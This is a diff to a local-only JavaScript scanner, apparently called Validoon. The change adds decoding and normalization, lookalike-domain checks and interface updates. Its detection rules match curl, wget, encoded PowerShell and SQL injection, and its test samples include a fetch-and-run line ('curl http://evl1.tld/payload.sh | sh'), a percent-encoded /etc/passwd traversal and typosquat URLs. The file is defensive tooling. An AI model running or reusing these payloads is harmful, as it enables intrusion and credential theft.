@@ -2,16 +2,17 @@
 (() => {
   "use strict";
 
-  const BUILD = "v2026-01-03_final_mvp_freeze_unified_B";
+  const BUILD = "v2026-01-05_normlayer_freeze";
   const nowISO = () => new Date().toISOString();
 
   function $(id) { return document.getElementById(id); }
 
-  function on(el, evt, fn) {
+  function safeOn(el, evt, fn) {
     if (!el) return;
-    el.addEventListener(evt, fn);
+    el.addEventListener(evt, fn, { passive: true });
   }
 
+  // ---------- Utils ----------
   function shannonEntropy(str) {
     if (!str) return 0;
     const freq = new Map();
@@ -29,18 +30,231 @@
     return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
   }
 
-  function classifyType(s) {
-    const x = (s || "").trim();
+  // ---------- Normalization Layer (strict & bounded) ----------
+  const MAX_NORM_LEN = 4096; // hard cap to avoid pathological cases
+
+  function clampLen(s) {
+    if (!s) return "";
+    return s.length > MAX_NORM_LEN ? s.slice(0, MAX_NORM_LEN) : s;
+  }
+
+  function normalizeNFKC(s) {
+    try { return s.normalize("NFKC"); } catch { return s; }
+  }
+
+  function normalizeSlashes(s) {
+    // defensive: unify backslashes
+    return s.replace(/\\/g, "/");
+  }
+
+  function decodePercentU(s) {
+    // %uXXXX
+    return s.replace(/%u([0-9a-fA-F]{4})/g, (_, h) => {
+      try { return String.fromCharCode(parseInt(h, 16)); } catch { return _; }
+    });
+  }
+
+  function decodePercentBytesManual(s) {
+    return s.replace(/%([0-9a-fA-F]{2})/g, (_, h) => {
+      try { return String.fromCharCode(parseInt(h, 16)); } catch { return _; }
+    });
+  }
+
+  function safePercentDecodeOnce(s) {
+    const pre = decodePercentU(s);
+    // Try decodeURIComponent if it looks safe, else manual fallback
+    try {
+      // decodeURIComponent throws on malformed sequences, so fallback to manual if needed
+      return decodeURIComponent(pre);
+    } catch {
+      return decodePercentBytesManual(pre);
+    }
+  }
+
+  function percentDecodeBounded(s, steps) {
+    let cur = s;
+    for (let i = 1; i <= 2; i++) {
+      const next = safePercentDecodeOnce(cur);
+      if (next !== cur) steps.push(`PCT_DECODE#${i}`);
+      cur = next;
+      if (cur === next && i === 1) break;
+      if (cur === next) break;
+    }
+    return cur;
+  }
+
+  const HTML_ENTITY_MAP = {
+    "&lt;": "<", "&gt;": ">", "&amp;": "&", "&quot;": "\"", "&#34;": "\"", "&#39;": "'",
+    "&apos;": "'", "&nbsp;": " "
+  };
+
+  function decodeHtmlEntitiesOnce(s, steps) {
+    let out = s;
+
+    // Named/common
+    for (const [k, v] of Object.entries(HTML_ENTITY_MAP)) {
+      if (out.includes(k)) out = out.split(k).join(v);
+    }
+
+    // Numeric: &#NN; and &#xNN;
+    out = out.replace(/&#x([0-9a-fA-F]+);/g, (_, hx) => {
+      try { return String.fromCharCode(parseInt(hx, 16)); } catch { return _; }
+    });
+    out = out.replace(/&#([0-9]+);/g, (_, nn) => {
+      try { return String.fromCharCode(parseInt(nn, 10)); } catch { return _; }
+    });
+
+    if (out !== s) steps.push("HTML_ENTITY");
+    return out;
+  }
+
+  function decodeJsEscapesOnce(s, steps) {
+    let out = s;
+    out = out.replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => {
+      try { return String.fromCharCode(parseInt(h, 16)); } catch { return _; }
+    });
+    out = out.replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => {
+      try { return String.fromCharCode(parseInt(h, 16)); } catch { return _; }
+    });
+    if (out !== s) steps.push("JS_ESCAPE");
+    return out;
+  }
+
+  function tryBase64DecodeDataUri(s, steps) {
+    const m = /^data:text\/html;base64,([a-z0-9+\/=\s]+)$/i.exec(s.trim());
+    if (!m) return s;
+
+    try {
+      const b64 = m[1].replace(/\s+/g, "");
+      const bin = atob(b64);
+      // best-effort UTF-8 decode
+      const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
+      const decoded = new TextDecoder("utf-8", { fatal: false }).decode(bytes);
+      steps.push("BASE64_DATAURI");
+      return decoded;
+    } catch {
+      return s;
+    }
+  }
+
+  function normalizeInput(raw) {
+    const steps = [];
+    let s = (raw || "").trim();
+
+    const n1 = normalizeNFKC(s);
+    if (n1 !== s) steps.push("NFKC");
+    s = n1;
+
+    const n2 = normalizeSlashes(s);
+    if (n2 !== s) steps.push("SLASH");
+    s = n2;
+
+    // If it's a data:text/html;base64,..., decode safely (bounded)
+    const preB64 = s;
+    s = tryBase64DecodeDataUri(s, steps);
+    if (s !== preB64) {
+      // After base64 decode, run minimal normalization once (bounded)
+      s = clampLen(s);
+    }
+
+    // Percent decode (max 2 passes)
+    s = percentDecodeBounded(s, steps);
+    s = clampLen(s);
+
+    // HTML entities (1 pass)
+    s = decodeHtmlEntitiesOnce(s, steps);
+    s = clampLen(s);
+
+    // JS escapes (1 pass)
+    s = decodeJsEscapesOnce(s, steps);
+    s = clampLen(s);
+
+    return { norm: s, steps };
+  }
+
+  // ---------- Type classification (use normalized view) ----------
+  function classifyType(raw, norm) {
+    const x = (norm || raw || "").trim();
     if (!x) return "Data";
-    const isURL = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);
+
+    const isURLish = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);
+
     const isExploit =
-      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);
+      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\/windows\/system32\/|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);
+
     if (isExploit) return "Exploit";
-    if (isURL) return "URL";
+    if (isURLish) return "URL";
     return "Data";
   }
 
-  // Signal rules
+  // ---------- Domain lookalike (basic skeleton, no network) ----------
+  function safeParseURL(u) {
+    try {
+      if (/^https?:\/\//i.test(u)) return new URL(u);
+      // allow schemeless domains
+      if (/^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(u)) return new URL("https://" + u);
+      return null;
+    } catch { return null; }
+  }
+
+  function extractHostCandidates(text) {
+    const s = text || "";
+    const hosts = new Set();
+
+    // full URLs
+    const urlRe = /\bhttps?:\/\/[^\s"'<>]+/ig;
+    for (const m of s.matchAll(urlRe)) {
+      const u = safeParseURL(m[0]);
+      if (u?.hostname) hosts.add(u.hostname);
+    }
+
+    // scheme-less //host
+    const schemeless = /(^|[=\s])\/\/([a-z0-9.-]+\.[a-z]{2,})(?=\/|$)/ig;
+    for (const m of s.matchAll(schemeless)) {
+      hosts.add(m[2]);
+    }
+
+    // bare domains
+    const bare = /\b([a-z0-9.-]+\.[a-z]{2,})\b/ig;
+    for (const m of s.matchAll(bare)) {
+      hosts.add(m[1]);
+    }
+
+    return [...hosts];
+  }
+
+  function skeletonHost(host) {
+    const map = new Map([
+      ["0", "o"], ["1", "l"], ["3", "e"], ["5", "s"], ["7", "t"],
+      ["I", "l"], ["|", "l"], ["O", "o"]
+    ]);
+    let out = "";
+    for (const ch of host) out += (map.get(ch) ?? ch);
+    return out.toLowerCase();
+  }
+
+  function lookalikeHit(raw, norm) {
+    const candidates = new Set([
+      ...extractHostCandidates(raw || ""),
+      ...extractHostCandidates(norm || "")
+    ]);
+
+    for (const host of candidates) {
+      if (!host) continue;
+      if (/^xn--/i.test(host)) continue; // already covered by HOMOGRAPH_RISK
+      const sk = skeletonHost(host);
+      if (sk !== host.toLowerCase()) {
+        return {
+          label: "LOOKALIKE_BASIC",
+          sev: 65,
+          conf: 75
+        };
+      }
+    }
+    return null;
+  }
+
+  // ---------- Signal rules ----------
   const RULES = [
     {
       label: "REDIRECT_PARAM",
@@ -74,12 +288,16 @@
     },
     {
       label: "LFI:ETC_PASSWD",
-      test: s => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\\system32\\drivers\\etc\\hosts/i.test(s),
+      test: s => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\/system32\/drivers\/etc\/hosts/i.test(s),
       sev: 80, conf: 75
     },
     {
       label: "CMD:CMD_CHAIN",
-      test: s => /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s),
+      test: s => {
+        // avoid raw false positives inside base64 data-uri; decoded content is handled via normalization
+        if (/^data:text\/html;base64,/i.test((s || "").trim())) return false;
+        return /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s);
+      },
       sev: 85, conf: 85
     },
     {
@@ -99,13 +317,44 @@
     }
   ];
 
-  function analyzeOne(input) {
-    const s = (input || "").trim();
+  function scanWithRules(s) {
     const hits = [];
-
+    const x = (s || "").trim();
     for (const r of RULES) {
-      if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
+      if (r.test(x)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
     }
+    return hits;
+  }
+
+  function analyzeOne(input) {
+    const raw = (input || "").trim();
+    const { norm, steps: normSteps } = normalizeInput(raw);
+
+    const hitsRaw = scanWithRules(raw).map(h => ({ ...h, src: "raw" }));
+    const hitsNorm = (norm !== raw ? scanWithRules(norm) : []).map(h => ({ ...h, src: "norm" }));
+
+    // Add basic lookalike detection (no network)
+    const lk = lookalikeHit(raw, norm);
+    const hitsLook = lk ? [{ ...lk, src: "norm" }] : [];
+
+    // Union by label (keep max sev/conf, keep src list)
+    const hitMap = new Map();
+    for (const h of [...hitsRaw, ...hitsNorm, ...hitsLook]) {
+      const prev = hitMap.get(h.label);
+      if (!prev) {
+        hitMap.set(h.label, { label: h.label, sev: h.sev, conf: h.conf, src: new Set([h.src]) });
+      } else {
+        prev.sev = Math.max(prev.sev, h.sev);
+        prev.conf = Math.max(prev.conf, h.conf);
+        prev.src.add(h.src);
+      }
+    }
+    const hits = [...hitMap.values()].map(h => ({
+      label: h.label,
+      sev: h.sev,
+      conf: h.conf,
+      src: [...h.src]
+    }));
 
     let severity = 0, confidence = 0;
     if (hits.length) {
@@ -117,10 +366,23 @@
     if (hits.some(h => h.sev >= 85) || hits.some(h => h.label === "DOWNLOAD_TOOL")) decision = "BLOCK";
     else if (hits.some(h => h.sev >= 55)) decision = "WARN";
 
-    const type = classifyType(s);
-    const entropy = shannonEntropy(s);
+    const type = classifyType(raw, norm);
+    const entropy = shannonEntropy(raw);
 
-    return { input: s, type, decision, severity, confidence, entropy, hits };
+    return {
+      input: raw,
+      raw,
+      norm,
+      normSteps,
+      type,
+      decision,
+      severity,
+      confidence,
+      entropy,
+      hits,
+      hitsRaw,
+      hitsNorm
+    };
   }
 
   function verdictFrom(rows) {
@@ -140,7 +402,7 @@
 
     const sigMap = new Map();
     for (const r of rows) {
-      for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
+      for (const h of (r.hits || [])) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
     }
     const signals = [...sigMap.entries()]
       .sort((a, b) => b[1] - a[1])
@@ -162,34 +424,30 @@
     };
   }
 
-  function setVerdictClass(verdict) {
-    const box = $("verdictBox");
-    if (!box) return;
-    box.classList.remove("verdict-secure", "verdict-suspicious", "verdict-danger");
-    if (verdict === "DANGER") box.classList.add("verdict-danger");
-    else if (verdict === "SUSPICIOUS") box.classList.add("verdict-suspicious");
-    else box.classList.add("verdict-secure");
-  }
-
   function setVerdictUI(meta) {
     const verdictText = $("verdictText");
-    if (verdictText) verdictText.textContent = meta.verdict;
-    setVerdictClass(meta.verdict);
+    const box = $("verdictBox");
+    if (!verdictText || !box) return;
 
-    const sevEl = $("peakSev");
-    const confEl = $("peakConf");
-    if (sevEl) sevEl.textContent = `${meta.peakSeverity}%`;
-    if (confEl) confEl.textContent = `${meta.confidence}%`;
+    verdictText.textContent = meta.verdict;
 
-    if ($("kScans")) $("kScans").textContent = String(meta.counts.scans);
-    if ($("kAllow")) $("kAllow").textContent = String(meta.counts.allow);
-    if ($("kWarn")) $("kWarn").textContent = String(meta.counts.warn);
-    if ($("kBlock")) $("kBlock").textContent = String(meta.counts.block);
+    box.style.borderColor =
+      meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
+      meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
+      "rgba(45,212,191,.25)";
+
+    $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
+    $("peakConf").textContent = `Confidence: ${meta.confidence}%`;
+
+    $("kScans").textContent = String(meta.counts.scans);
+    $("kAllow").textContent = String(meta.counts.allow);
+    $("kWarn").textContent = String(meta.counts.warn);
+    $("kBlock").textContent = String(meta.counts.block);
 
     const reco = $("reco");
     if (reco) {
       if (meta.verdict === "DANGER") {
-        reco.textContent = "Remediation: Block these inputs. Do NOT open. Verify domain ownership. Escalate with JSON report.";
+        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
       } else if (meta.verdict === "SUSPICIOUS") {
         reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
       } else {
@@ -200,68 +458,58 @@
     const sigWrap = $("signals");
     if (sigWrap) {
       sigWrap.innerHTML = "";
+      for (const s of meta.signals) {
+        const d = document.createElement("div");
+        d.className = "sig";
+        d.textContent = `${s.label} ×${s.count}`;
+        sigWrap.appendChild(d);
+      }
       if (!meta.signals.length) {
         const d = document.createElement("div");
-        d.className = "chip";
+        d.className = "sig";
         d.textContent = "No active signals";
         sigWrap.appendChild(d);
-      } else {
-        for (const s of meta.signals) {
-          const d = document.createElement("div");
-          d.className = "chip";
-          if (meta.verdict === "DANGER") d.classList.add("bad");
-          else if (meta.verdict === "SUSPICIOUS") d.classList.add("warn");
-          else d.classList.add("ok");
-          d.textContent = `${s.label} ×${s.count}`;
-          sigWrap.appendChild(d);
-        }
       }
     }
   }
 
   function renderRows(rows) {
-    const body = $("rowsBody");
-    if (!body) return;
-    body.innerHTML = "";
-
-    if (!rows.length) {
-      const tr = document.createElement("tr");
-      tr.className = "empty";
-      const td = document.createElement("td");
-      td.colSpan = 6;
-      td.textContent = "No results yet.";
-      tr.appendChild(td);
-      body.appendChild(tr);
-      return;
-    }
+    const host = $("rows");
+    if (!host) return;
+    host.innerHTML = "";
 
     for (const r of rows) {
-      const tr = document.createElement("tr");
+      const tr = document.createElement("div");
+      tr.className = "trow";
 
-      const td1 = document.createElement("td");
-      td1.className = "mono";
-      td1.textContent = r.input.length > 180 ? r.input.slice(0, 180) + "…" : r.input;
+      const dotClass = r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad");
 
-      const td2 = document.createElement("td");
-      td2.textContent = r.type;
+      const c1 = document.createElement("div");
+      c1.className = "mono";
+      c1.textContent = r.input.length > 120 ? r.input.slice(0, 120) + "…" : r.input;
 
-      const td3 = document.createElement("td");
-      const badge = document.createElement("span");
-      badge.className = "badge " + (r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad"));
-      badge.textContent = r.decision;
-      td3.appendChild(badge);
+      const c2 = document.createElement("div");
+      c2.textContent = r.type;
 
-      const td4 = document.createElement("td");
-      td4.textContent = `${r.severity}%`;
+      const c3 = document.createElement("div");
+      c3.className = "tag";
+      const dot = document.createElement("span");
+      dot.className = `dot ${dotClass}`;
+      const t = document.createElement("span");
+      t.textContent = r.decision;
+      c3.append(dot, t);
 
-      const td5 = document.createElement("td");
-      td5.textContent = `${r.confidence}%`;
+      const c4 = document.createElement("div");
+      c4.textContent = `${r.severity}%`;
 
-      const td6 = document.createElement("td");
-      td6.textContent = String(r.entropy);
+      const c5 = document.createElement("div");
+      c5.textContent = `${r.confidence}%`;
 
-      tr.append(td1, td2, td3, td4, td5, td6);
-      body.appendChild(tr);
+      const c6 = document.createElement("div");
+      c6.textContent = String(r.entropy);
+
+      tr.append(c1, c2, c3, c4, c5, c6);
+      host.appendChild(tr);
     }
   }
 
@@ -272,6 +520,7 @@
       .filter(Boolean);
   }
 
+  // Tests (as before)
   const TEST_A = [
     "hello world",
     "https://example.com/",
@@ -326,7 +575,10 @@
     "C:\\Windows\\System32\\drivers\\etc\\hosts",
     "&& curl http://evl1.tld/payload.sh | sh",
     "UNION SELECT username,password FROM users",
-    "powershell -enc SQBFAFgA"
+    "powershell -enc SQBFAFgA",
+    "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "http://paypaI.com/security",
+    "http://micros0ft.com/account/verify"
   ];
 
   let lastReport = null;
@@ -338,6 +590,7 @@
     const lines = parseInputLines(inputEl.value);
     const rows = lines.map(analyzeOne);
     const report = buildReport(rows);
+
     lastReport = report;
 
     setVerdictUI({
@@ -393,16 +646,12 @@
 
   function openInfo() {
     const dlg = $("infoDlg");
-    if (!dlg) return;
-    dlg.classList.remove("hidden");
-    dlg.setAttribute("aria-hidden", "false");
+    if (dlg && typeof dlg.showModal === "function") dlg.showModal();
   }
 
   function closeInfo() {
     const dlg = $("infoDlg");
-    if (!dlg) return;
-    dlg.classList.add("hidden");
-    dlg.setAttribute("aria-hidden", "true");
+    if (dlg && typeof dlg.close === "function") dlg.close();
   }
 
   function boot() {
@@ -416,23 +665,14 @@
       counts: { scans: 0, allow: 0, warn: 0, block: 0 },
       signals: []
     });
-    renderRows([]);
 
-    on($("btnLoadA"), "click", () => loadTest(TEST_A));
-    on($("btnLoadB"), "click", () => loadTest(TEST_B));
-    on($("btnScan"), "click", runScanFromTextarea);
-    on($("btnExport"), "click", exportJSON);
-    on($("btnClear"), "click", clearAll);
-    on($("btnInfo"), "click", openInfo);
-    on($("btnCloseInfo"), "click", closeInfo);
-
-    // Close modal on backdrop click
-    const dlg = $("infoDlg");
-    if (dlg) {
-      on(dlg, "click", (e) => {
-        if (e.target === dlg) closeInfo();
-      });
-    }
+    safeOn($("btnLoadA"), "click", () => loadTest(TEST_A));
+    safeOn($("btnLoadB"), "click", () => loadTest(TEST_B));
+    safeOn($("btnScan"), "click", runScanFromTextarea);
+    safeOn($("btnExport"), "click", exportJSON);
+    safeOn($("btnClear"), "click", clearAll);
+    safeOn($("btnInfo"), "click", openInfo);
+    safeOn($("btnCloseInfo"), "click", closeInfo);
 
     console.log(`[Validoon] ${BUILD} loaded. Local-only. No network.`);
   }
